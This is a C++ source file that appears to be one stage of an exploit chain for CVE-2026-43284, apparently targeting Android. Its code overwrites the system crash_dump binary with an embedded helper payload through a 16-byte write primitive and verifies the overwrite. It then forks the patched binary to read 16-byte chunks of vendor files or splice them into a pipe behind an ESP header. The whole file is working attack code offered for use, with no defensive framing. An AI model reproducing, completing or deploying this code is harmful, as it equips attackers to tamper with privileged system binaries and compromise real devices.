/* CVE-2026-43284 patch #1 + crash_dump bridge implementation. */

#include "backend/cve_2026_43284/steps/crash_dump.hpp"

#include <array>
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <string_view>

#if defined(__linux__)
#include <sys/wait.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284::steps {

    SpliceHelperPlan splice_helper_plan() noexcept {
        SpliceHelperPlan plan{};
        plan.raw = embed::splicehelper_bytes();
        plan.raw_size = embed::splicehelper_size();
        plan.padded = plan.raw;
        plan.padded_size = embed::splicehelper_padded_size();
        plan.sha256 = embed::kSpliceHelperSha256;
        return plan;
    }

    CrashDumpPatchError patch_crash_dump(const CrashDumpPatchOps &ops) noexcept {
        if (!ops.write_ready()) {
            return CrashDumpPatchError::NotAvailable;
        }
        const SpliceHelperPlan plan = splice_helper_plan();
        if (plan.raw == nullptr || plan.raw_size == 0U || plan.padded == nullptr ||
            plan.padded_size == 0U ||
            (plan.padded_size % kCrashDumpBlockBytes) != 0U) {
            return CrashDumpPatchError::NotAvailable;
        }

        const std::size_t blocks = plan.padded_size / kCrashDumpBlockBytes;
        for (std::size_t b = 0U; b < blocks; ++b) {
            const std::uint64_t offset =
                    static_cast<std::uint64_t>(b) * kCrashDumpBlockBytes;
            const std::int32_t written = ops.write.write16(
                    ops.write.ctx, offset,
                    plan.padded + b * kCrashDumpBlockBytes);
            if (written != 0) {
                return CrashDumpPatchError::WriteFailed;
            }
        }

        if (ops.read16 == nullptr) {
            return CrashDumpPatchError::None;
        }
        std::array<std::uint8_t, kCrashDumpBlockBytes> verify{};
        const long got = ops.read16(ops.write.ctx, kCrashDumpVerifyOffset,
                                    verify.data());
        if (got != static_cast<long>(kCrashDumpBlockBytes)) {
            /* upstream: "patch #1 verify skipped: cannot read". */
            return CrashDumpPatchError::None;
        }
        if (std::memcmp(verify.data(), plan.raw + kCrashDumpVerifyOffset,
                        kCrashDumpBlockBytes) != 0) {
            return CrashDumpPatchError::VerifyMismatch;
        }
        return CrashDumpPatchError::None;
    }

    bool is_vendor_path(std::string_view path) noexcept {
        return path.substr(0U, 8U) == "/vendor/" ||
               path.substr(0U, 15U) == "/system/vendor/";
    }

    namespace {
#if defined(__linux__)
        /* Fork and exec the already-patched crash_dump64 with argv
         * {offset, path} and its stdout bound to stdout_fd. The embedded helper
         * exits with ret - 16, so exit 0 proves a full 16-byte transfer.
         * Returns 0 on success, or a negative -errno. */
        long exec_crash_dump(std::string_view path, std::uint64_t offset,
                             int stdout_fd) noexcept {
            std::array<char, 32> offset_text{};
            std::size_t n = 0U;
            std::uint64_t value = offset;
            char digits[24] = {};
            std::size_t d = 0U;
            do {
                digits[d++] = static_cast<char>('0' + (value % 10U));
                value /= 10U;
            } while (value != 0U);
            while (d > 0U) {
                offset_text[n++] = digits[--d];
            }
            offset_text[n] = '\0';

            std::array<char, 256> path_text{};
            for (std::size_t i = 0U; i < path.size(); ++i) {
                path_text[i] = path[i];
            }
            path_text[path.size()] = '\0';

            const pid_t child = ::fork();
            if (child < 0) {
                return -errno;
            }
            if (child == 0) {
                if (stdout_fd != 1) {
                    if (::dup2(stdout_fd, 1) < 0) {
                        ::_exit(127);
                    }
                    (void)::close(stdout_fd);
                }
                ::execl(kCrashDump64Path, "crashdump64", offset_text.data(),
                        path_text.data(), static_cast<char *>(nullptr));
                ::_exit(127);
            }
            int status = 0;
            while (::waitpid(child, &status, 0) < 0) {
                if (errno != EINTR) {
                    return -errno;
                }
            }
            return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -EIO;
        }

        /* The bridge's own context is unused: the helper path is a compile-time
         * constant and the pipe is local. The signature keeps the injected form
         * uniform for host fakes. */
        long real_bridge_read16(void * /*ctx*/, std::string_view path,
                                std::uint64_t offset, std::uint8_t out[16]) noexcept {
            if (out == nullptr || path.empty() || path.size() >= 256U) {
                return -EINVAL;
            }
            int fds[2] = {-1, -1};
            if (::pipe(fds) != 0) {
                return -errno;
            }
            const long started = exec_crash_dump(path, offset, fds[1]);
            (void)::close(fds[1]);
            long total = started;
            if (started == 0) {
                total = 0;
                while (total < static_cast<long>(kCrashDumpBlockBytes)) {
                    const ssize_t got = ::read(
                            fds[0], out + total,
                            kCrashDumpBlockBytes - static_cast<std::size_t>(total));
                    if (got < 0) {
                        if (errno == EINTR) {
                            continue;
                        }
                        total = -errno;
                        break;
                    }
                    if (got == 0) {
                        break;
                    }
                    total += static_cast<long>(got);
                }
            }
            (void)::close(fds[0]);
            if (total < 0) {
                return total;
            }
            return total == static_cast<long>(kCrashDumpBlockBytes)
                           ? static_cast<long>(kCrashDumpBlockBytes)
                           : -EIO;
        }

        /* Helper write source: the caller already holds the write end of the
         * pipe that carries the ESP header/IV, so the helper splices the page
         * directly behind it (exp.c do_one_write_cbc use_helper=1). The full
         * 16-byte transfer is implied by the helper's exit code 0. */
        long real_bridge_splice16_into_pipe(void * /*ctx*/, std::string_view path,
                                            std::uint64_t offset,
                                            int pipe_write_fd) noexcept {
            if (path.empty() || path.size() >= 256U || pipe_write_fd < 0) {
                return -EINVAL;
            }
            const long started = exec_crash_dump(path, offset, pipe_write_fd);
            return started == 0 ? static_cast<long>(kCrashDumpBlockBytes) : started;
        }
#endif
    } // namespace

    CrashDumpBridgeOps real_crash_dump_bridge() noexcept {
        CrashDumpBridgeOps ops{};
#if defined(__linux__)
        ops.ctx = nullptr;
        ops.read16 = &real_bridge_read16;
        ops.splice16_into_pipe = &real_bridge_splice16_into_pipe;
#endif
        return ops;
    }

} // namespace ghostlock::backend::cve_2026_43284::steps
